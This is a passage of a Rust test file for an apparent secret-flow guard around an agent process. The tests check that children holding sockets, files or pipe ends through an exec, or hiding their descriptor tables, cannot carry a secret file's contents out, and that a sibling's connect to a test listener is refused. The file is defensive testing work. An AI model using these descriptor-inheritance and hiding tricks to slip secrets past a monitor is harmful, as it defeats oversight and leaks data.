/// connection, and refuses the raw open (as for a child seen at once).
#[test]
#[ignore]
fn a_readers_child_caught_inside_its_exec_with_an_unbound_connection_refuses_the_raw_open() {
    let _one = serial();
    let secret = Secret::new("sweep-sock-inside-exec");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (port, _got) = tcp_listener(DEST);
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let stop = secret.file("c.stop");
    let Some(code) = guarded(cfg, move || {
        let out = secret_file(&path, "out.txt");
        let reader = fork_run(|| {
            let (child, hidden) = hidden_child(stop.clone(), HIDE, || {
                // Kept across its "exec": a connection with no close-on-exec flag.
                if let Ok(fd) = tcp_connect(DEST, port) {
                    unsafe { libc::fcntl(fd, libc::F_SETFD, 0) };
                }
            });
            let readable = table_readable(child);
            let v = match read_file(&path) {
                Ok(_) => "raw".to_string(),
                Err(e) => format!("refused e{e}"),
            };
            let _ = std::fs::write(&stop, "");
            reap(child);
            let _ = std::fs::write(&out, format!("hidden={hidden} readable={readable} open={v}"));
            0
        });
        let rc = reap(reader);
        let _ = std::fs::write(&rp, format!("{} rc={rc:?}", std::fs::read_to_string(&out).unwrap_or_default()));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    if !hidden_report("sweep socket inside exec", report.contains("hidden=true"), report.contains("readable=true")) {
        return;
    }
    assert!(report.ends_with(&format!("open=refused e{} rc=Some(0)", libc::EACCES)), "a connection to an unbound host held through an exec refuses the raw open: {report}");
    eprintln!("SWEEP SOCKET INSIDE-EXEC PASS");
}

/// The taint-time sweep's files (`pipe_flow::written_files`, plan 13 D5):
/// the reader's child holds a file open for writing and is inside an "exec"
/// at the read. Before: the file took no label. Now: it does.
#[test]
#[ignore]
fn a_readers_child_caught_inside_its_exec_has_its_file_labeled() {
    let _one = serial();
    let secret = Secret::new("sweep-file-inside-exec");
    secret.root_is_the_agent();
    let (arbiter, labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (path, rp, log) = (secret.path.clone(), secret.file("report.txt"), secret.file("log.txt"));
    let stop = secret.file("c.stop");
    let log2 = log.clone();
    let Some(code) = guarded(cfg, move || {
        let out = secret_file(&path, "out.txt");
        let reader = fork_run(|| {
            let (child, hidden) = hidden_child(stop.clone(), HIDE, || {
                std::mem::forget(open_write(&log2));
            });
            let readable = table_readable(child);
            let v = if read_file(&path).is_ok() { "raw" } else { "refused" };
            let _ = std::fs::write(&stop, "");
            reap(child);
            let _ = std::fs::write(&out, format!("hidden={hidden} readable={readable} open={v}"));
            0
        });
        let rc = reap(reader);
        let _ = std::fs::write(&rp, format!("{} rc={rc:?}", std::fs::read_to_string(&out).unwrap_or_default()));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    if !hidden_report("sweep file inside exec", report.contains("hidden=true"), report.contains("readable=true")) {
        return;
    }
    assert!(report.ends_with("open=raw rc=Some(0)"), "{report}");
    assert!(!labeled(&labels, &log).is_empty(), "a file held open for writing through an exec takes the label ({report}); labels: {:?}", labels.lock().unwrap());
    eprintln!("SWEEP FILE INSIDE-EXEC PASS");
}

/// The sweep's pipes (`pipe_flow::write_ends`, `guard_flow::flow_targets`)
/// and the later event (`guard_flow::later_flow`, `pipe_flow::writes_any`):
/// the reader's child holds the write end of a pipe a sibling of the reader
/// reads, and is inside an "exec" at the read. Before: the sibling was no
/// receiver and its connect to an unbound host went out. Now: it is a
/// holder and its connect is refused.
#[test]
#[ignore]
fn a_pipe_written_by_a_child_caught_inside_its_exec_carries_the_taint() {
    let _one = serial();
    let secret = Secret::new("sweep-pipe-inside-exec");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (port, got) = tcp_listener(DEST);
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let stop = secret.file("c.stop");
    let Some(code) = guarded(cfg, move || {
        // The root must be the agent (never made a holder, so the sibling
        // does not inherit from it): the agent is the first-STARTED process
        // of the test binary, in clock ticks, and the guard's own helper,
        // forked at the reader's open, runs it too; a tick apart, the root
        // started first.
        std::thread::sleep(Duration::from_millis(30));
        let (r, w) = pipe();
        let (go, res) = (secret_file(&path, "go"), secret_file(&path, "res.txt"));
        // The sibling: holds the pipe's read end, connects once the reader
        // has read (a file it polls: a pipe from the reader would be a flow
        // of its own).
        let go2 = go.clone();
        let sib = fork_run(|| {
            unsafe { libc::close(w) };
            let end = std::time::Instant::now() + Duration::from_secs(20);
            while !go2.exists() && std::time::Instant::now() < end {
                std::thread::sleep(Duration::from_millis(2));
            }
            let sent = send_to(DEST, port, b"SIBLING");
            let _ = std::fs::write(secret_file(&path, "sib.txt"), format!("connect={sent}"));
            unsafe { libc::close(r) };
            0
        });
        let res2 = res.clone();
        let stop2 = stop.clone();
        let reader = fork_run(|| {
            unsafe { libc::close(r) };
            let (child, hidden) = hidden_child(stop.clone(), HIDE, || {
                // Kept across its "exec": a copy without the close-on-exec flag.
                let _keep = unsafe { libc::dup(w) };
                unsafe { libc::close(w) };
            });
            unsafe { libc::close(w) };
            let readable = table_readable(child);
            let v = if read_file(&path).is_ok() { "raw" } else { "refused" };
            let _ = std::fs::write(&res2, format!("hidden={hidden} readable={readable} open={v}"));
            // Lives on until `stop` (its exit status would reach its parent,
            // the sibling's, a flow of its own: plan 13 §4.9).
            let end = std::time::Instant::now() + Duration::from_secs(20);
            while !stop2.exists() && std::time::Instant::now() < end {
                std::thread::sleep(Duration::from_millis(5));
            }
            reap(child);
            0
        });
        unsafe {
            libc::close(r);
            libc::close(w);
        }
        until_within(Duration::from_secs(20), Duration::from_millis(2), "the reader's report", || res.exists());
        let _ = std::fs::write(&go, "");
        let sc = reap(sib);
        let _ = std::fs::write(&stop, "");
        let rc = reap(reader);
        let _ = std::fs::write(&rp, format!("{} {} rc={rc:?} sc={sc:?}", std::fs::read_to_string(&res).unwrap_or_default(), std::fs::read_to_string(secret_file(&path, "sib.txt")).unwrap_or_default()));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    if !hidden_report("sweep pipe inside exec", report.contains("hidden=true"), report.contains("readable=true")) {
        return;
    }
    std::thread::sleep(Duration::from_millis(200));
    let seen = String::from_utf8_lossy(&got.lock().unwrap()).to_string();
    assert!(report.contains("open=raw"), "{report}");
    assert!(report.contains(&format!("connect=e{}", libc::EACCES)), "the reader of a pipe a holder's child writes through an exec is a holder: {report}; the host saw {seen:?}");
    eprintln!("SWEEP PIPE INSIDE-EXEC PASS ({report})");
}

/// The bound (`pipe_flow::EXEC_SETTLE_WAIT`): the reader's child looks
/// inside an exec for 4 s, past the 2 s the sweep waits. Its table is not
/// judged whole, so the reader's raw open is refused at the bound (before:
/// read as empty, the open went on at once).
#[test]
#[ignore]
fn a_readers_child_whose_exec_does_not_end_refuses_the_raw_open_at_the_bound() {
    let _one = serial();
    let secret = Secret::new("sweep-unsettled");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let stop = secret.file("c.stop");
    let Some(code) = guarded(cfg, move || {
        let out = secret_file(&path, "out.txt");
        let reader = fork_run(|| {
            let (child, hidden) = hidden_child(stop.clone(), Duration::from_secs(4), || {});
            let readable = table_readable(child);
            let t0 = std::time::Instant::now();
            let v = match read_file(&path) {
                Ok(_) => "raw".to_string(),
                Err(e) => format!("refused e{e}"),
            };
            let ms = t0.elapsed().as_millis();
            let _ = std::fs::write(&stop, "");
            reap(child);
            let _ = std::fs::write(&out, format!("hidden={hidden} readable={readable} open={v} ms={ms}"));
            0
        });
        let rc = reap(reader);
        let _ = std::fs::write(&rp, format!("{} rc={rc:?}", std::fs::read_to_string(&out).unwrap_or_default()));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    if !hidden_report("sweep unsettled", report.contains("hidden=true"), report.contains("readable=true")) {
        return;
    }
    if report.contains("readable=true") {
        // The guard reads the table: nothing to wait for, the child holds nothing.
        assert!(report.contains("open=raw"), "{report}");
        return;
    }
    assert!(report.contains(&format!("open=refused e{}", libc::EACCES)), "a table hidden past the bound refuses the raw open: {report}");
    let ms: u64 = report.split("ms=").nth(1).and_then(|s| s.split_whitespace().next()).and_then(|s| s.parse().ok()).unwrap_or(0);
    assert!((1900..3900).contains(&ms), "refused at the bound, not before nor when the child came back: {report}");
    eprintln!("SWEEP UNSETTLED PASS ({report})");
}
